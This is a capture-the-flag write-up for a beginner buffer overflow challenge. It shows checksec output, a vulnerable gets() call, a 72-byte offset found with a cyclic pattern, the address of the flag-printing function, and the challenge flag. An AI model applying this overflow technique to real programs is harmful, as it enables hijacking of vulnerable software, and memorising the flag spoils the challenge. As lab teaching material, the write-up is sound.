## **Challenge Name: !Underflow**

### **Solves**
- **Solves**: 388
- **Points**: 100

### **Description**

You know that moment when you're packing for a trip as a kid & your parents try to fit in a little more than the suitcase's capacity everytime, do not try that here. Something simple to warm you up.

Connect using nc 192.168.228.129 1337

---

### **Approach**  

Download the given binary and run checksec,

```bash
┌──(kali㉿kali)-[~/Desktop/tmp]
└─$ checksec exploit-me                            
[*] '/home/kali/Desktop/tmp/exploit-me'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

No PIE, No Canary, nothing to worry about here.

Let's look how the binary behaves when we run it.

Ok, so program asks for a name and then prints it out.

We can have 2 straight derivations,

1. Buffer Overflow
2. Format String Vuln
   
Buffer flow occurs when user supplied input is bigger than the allocated size for the input, this causes the stack to be overwritten.

Format string occurs when......(TODO)

Let's decompile & look for buffer overflow.

The hello function does show the use of gets() function which is vulnerable to buffer overlow.

```c
void hello(void)

{
  char local_48 [64];
  
  puts("Enter your name:");
  gets(local_48);
  printf("Hello, %s\n",local_48);
  return;
}
```
64 is the stack size, so let's start by inputting a string of length 64 & keep on increasing untill we find a core dump.

We find out the core dump at size 72.

```bash
┌──(kali㉿kali)-[~/Desktop/tmp]
└─$ cyclic 72 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa
                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/tmp]
└─$ ./exploit-me 
Enter your name:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa
Hello, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa
zsh: segmentation fault (core dumped)  ./exploit-me
```

Now, let's find out the address of the flag printing function using gdb.

```bash
0x0000000000401156  print_flag
```

Ok, so we have our padding of 72 & the target function 0x0000000000401156 which prints the flag.

Let's try to exploit locally & then, remote.

Use [script.py](Resources/script.py) to get the flag.

P.S. - I accidentally uploaded the binary with the flag, but this was the intended solution and not getting it through strings or decompilation.

---

### **Flag**
```
ACECTF{buff3r_0v3rfl3w}
```
---
